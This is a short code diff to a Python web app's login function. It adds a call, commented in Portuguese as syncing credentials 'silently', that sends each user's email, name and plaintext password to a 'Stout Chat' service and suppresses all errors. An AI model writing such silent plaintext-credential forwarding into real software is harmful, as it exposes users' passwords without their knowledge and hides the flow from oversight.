@@ -66,6 +66,14 @@ def login():
             "is_admin": user.is_admin,
             "roles": [r.name for r in user.roles]
         }
+
+        # Sincroniza usuário e credenciais no Stout Chat silenciosamente
+        try:
+            from app.services.stout_service import sync_user_to_stout
+            sync_user_to_stout(email=user.email, password=password, username=user.name)
+        except Exception:
+            pass
+
         return redirect(url_for("index"))
 
     return render_template("login.html", universities=unis)
